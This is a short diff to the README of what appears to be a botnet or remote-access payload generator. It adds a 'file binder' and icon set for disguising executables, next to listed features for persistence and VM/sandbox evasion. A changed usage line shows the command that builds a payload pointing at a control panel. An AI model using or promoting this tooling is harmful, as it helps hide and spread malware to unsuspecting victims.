@@ -68,6 +68,8 @@ THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS
 - [x] Debug Mode [**Can Be Used In Debugging Payload**]
 - [x] Persistence Payload
 - [x] 3 Powerfull Methods to Detect/Bypass VM (such as VirtualBox, VMware, Sandboxie)
+- [x] Built-in File Binder 
+- [x] Useful Icons Inside **icon** Folder
 
 
 | Virtual Machine Bypass Methods Includes |
@@ -109,7 +111,7 @@ $ python -m pip install -r requirements.txt
 $ python Generator.py --help
 
 # Making Payload/BOTNET
-$ python Generator.py -s localhost/panel -o output_file_name --icon icon_path
+$ python Generator.py -s localhost/panel -o output_file_name --icon icon/exe.ico
 
 ```
 
